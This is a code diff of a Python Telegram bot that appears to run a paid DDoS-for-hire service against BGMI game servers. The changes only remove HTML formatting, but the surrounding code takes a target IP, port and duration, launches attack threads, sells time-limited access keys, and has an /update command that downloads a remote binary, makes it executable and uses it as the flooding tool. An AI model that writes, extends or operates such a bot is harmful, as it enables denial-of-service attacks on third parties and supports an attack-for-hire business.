@@ -286,7 +286,7 @@ def handle_bgmi(message):
         usage_message = (
             "✅ <b>𝐔𝐬𝐚𝐠𝐞 :-</b> <code>/bgmi <target> <port> <time></code>"
         )
-        bot.reply_to(message, usage_message, parse_mode="HTML")
+        bot.reply_to(message, usage_message, )
         return
 
     target, port, time_duration = command[1], command[2], int(command[3])
@@ -294,7 +294,7 @@ def handle_bgmi(message):
     # --- [NEW] IP & PORT LOCK (Same target check) ---
     for atk in active_attacks.values():
         if atk['ip'] == target and atk['port'] == port:
-            bot.reply_to(message, f"❌ <b>𝐓𝐚𝐫𝐠𝐞𝐭 𝐋𝐨𝐜𝐤𝐞𝐝!</b>\nYeh target (<code>{target}:{port}</code>) pehle se attack ho raha hai.", parse_mode="HTML")
+            bot.reply_to(message, f"❌ <b>𝐓𝐚𝐫𝐠𝐞𝐭 𝐋𝐨𝐜𝐤𝐞𝐝!</b>\nYeh target (<code>{target}:{port}</code>) pehle se attack ho raha hai.", )
             return
         
     # --- 🛡️ IP & PORT VALIDATION ---
@@ -302,20 +302,20 @@ def handle_bgmi(message):
     ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
     
     if not ip_pattern.match(target):
-        bot.reply_to(message, "❌ <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐈𝐏 𝐀𝐝𝐝𝐫𝐞𝐬𝐬!</b>", parse_mode="HTML")
+        bot.reply_to(message, "❌ <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐈𝐏 𝐀𝐝𝐝𝐫𝐞𝐬𝐬!</b>", )
         return
         
     try:
         port_int = int(port)
         if not (1 <= port_int <= 65535):
-            bot.reply_to(message, "❌ <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐏𝐨𝐫𝐭! (1-65535)</b>", parse_mode="HTML")
+            bot.reply_to(message, "❌ <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐏𝐨𝐫𝐭! (1-65535)</b>", )
             return
     except ValueError:
-        bot.reply_to(message, "❌ <b>𝐏𝐨𝐫𝐭 𝐧𝐮𝐦𝐛𝐞𝐫 𝐡𝐨𝐧𝐚 𝐜𝐡𝐚𝐡𝐢𝐲𝐞.</b>", parse_mode="HTML")
+        bot.reply_to(message, "❌ <b>𝐏𝐨𝐫𝐭 𝐧𝐮𝐦𝐛𝐞𝐫 𝐡𝐨𝐧𝐚 𝐜𝐡𝐚𝐡𝐢𝐲𝐞.</b>", )
         return
 
     if time_duration > 240:
-        bot.reply_to(message, "❌ <b>𝐄𝐫𝐫𝐨𝐫: 𝐌𝐚𝐱 𝟐𝟒𝟎𝐬.</b>", parse_mode="HTML")
+        bot.reply_to(message, "❌ <b>𝐄𝐫𝐫𝐨𝐫: 𝐌𝐚𝐱 𝟐𝟒𝟎𝐬.</b>", )
         return
 
     # Attack Start Logic
@@ -333,7 +333,7 @@ def handle_bgmi(message):
     f"📊 <b>𝐒𝐥𝐨𝐭𝐬:</b> {slots_used}/{MAX_SLOTS} (Left: {slots_left})\n"
     f"━━━━━━━━━━━━━━━━━━━━━━\n"
     f"🚀 <b>𝐏𝐨𝐰𝐞𝐫:</b> 𝐃𝐑𝐗 𝐃𝐃𝐎𝐒 𝐏𝐎𝐖𝐄𝐑 🔥"
-    ), parse_mode="HTML")
+    ), )
 
     # Background thread for execution and finished message
     threading.Thread(target=run_attack, args=(message.chat.id, target, port, time_duration)).start()
@@ -350,7 +350,7 @@ def handle_genkey(message):
             usage_text = (
                 "✅ <b>Usage:</b> <code>/genkey <random/name> <time> <price> <ddos_time></code>"
             )
-            bot.reply_to(message, usage_text, parse_mode="HTML")
+            bot.reply_to(message, usage_text, )
             return
 
         key_type = command[1]
@@ -373,9 +373,9 @@ def handle_genkey(message):
             f"━━━━━━━━━━━━━━━━━━━━━━\n"
             f"📢 <b>𝐍𝐨𝐭𝐢𝐜𝐞:</b> Tap the key to copy it!"
         )
-        bot.reply_to(message, response, parse_mode="HTML")
+        bot.reply_to(message, response, )
     else:
-        bot.reply_to(message, "❌ <b>𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝!</b> Only Admin can generate keys.", parse_mode="HTML")
+        bot.reply_to(message, "❌ <b>𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝!</b> Only Admin can generate keys.", )
 
 @bot.message_handler(commands=['redeem'])
 def handle_redeem(message):
@@ -449,21 +449,21 @@ def broadcast_message(message):
             # Sabhi users ko bhejna
             for uid in allowed_user_ids:
                 try:
-                    bot.send_message(uid, formatted_msg, parse_mode="HTML")
+                    bot.send_message(uid, formatted_msg, )
                     success_count += 1
                 except:
                     pass # Agar user ne bot block kiya ho
             
             bot.reply_to(message, f"✅ <b>𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 𝐒𝐞𝐧𝐭!</b>\n📊 <b>𝐑𝐞𝐜𝐢𝐩𝐢𝐞𝐧𝐭𝐬:</b> {success_count} Users")
         else:
-            bot.reply_to(message, "⚠️ <b>𝐔𝐬𝐚𝐠𝐞:</b> /broadcast &lt;your message&gt;", parse_mode="HTML")
+            bot.reply_to(message, "⚠️ <b>𝐔𝐬𝐚𝐠𝐞:</b> /broadcast &lt;your message&gt;", )
     else:
         bot.reply_to(message, "❌ <b>𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝!</b> Sirf Admin notice bhej sakta hai.")
 
 @bot.message_handler(commands=['update'])
 def update_files(message):
     if str(message.chat.id) in admin_id: # केवल तुम (Admin) ही कर सकते हो
-        bot.reply_to(message, "⏳ <b>𝐅𝐞𝐭𝐜𝐡𝐢𝐧𝐠 𝐧𝐞𝐰 𝐛𝐢𝐧𝐚𝐫𝐲 𝐟𝐢𝐥𝐞 𝐟𝐫𝐨𝐦 𝐃𝐑𝐗 𝐆𝐚𝐭𝐞𝐰𝐚𝐲...</b>", parse_mode="HTML")
+        bot.reply_to(message, "⏳ <b>𝐅𝐞𝐭𝐜𝐡𝐢𝐧𝐠 𝐧𝐞𝐰 𝐛𝐢𝐧𝐚𝐫𝐲 𝐟𝐢𝐥𝐞 𝐟𝐫𝐨𝐦 𝐃𝐑𝐗 𝐆𝐚𝐭𝐞𝐰𝐚𝐲...</b>", )
         try:
             # यह तुम्हारे दिए हुए लिंक से फाइल उठाएगा
             r = requests.get(REMOTE_UPDATE_URL) 
@@ -473,7 +473,7 @@ def update_files(message):
             # फाइल को चलने की ताकत (Permission) देना
             os.chmod("bgmi", 0o777) 
             
-            bot.reply_to(message, "✅ <b>𝐃𝐑𝐗 𝐁𝐢𝐧𝐚𝐫𝐲 𝐔𝐩𝐝𝐚𝐭𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲!</b>\nबोट अब नई फाइल का इस्तेमाल करेगा।", parse_mode="HTML")
+            bot.reply_to(message, "✅ <b>𝐃𝐑𝐗 𝐁𝐢𝐧𝐚𝐫𝐲 𝐔𝐩𝐝𝐚𝐭𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲!</b>\nबोट अब नई फाइल का इस्तेमाल करेगा।", )
         except Exception as e:
             bot.reply_to(message, f"❌ <b>𝐔𝐩𝐝𝐚𝐭𝐞 𝐅𝐚𝐢𝐥𝐞𝐝:</b> {e}")
 
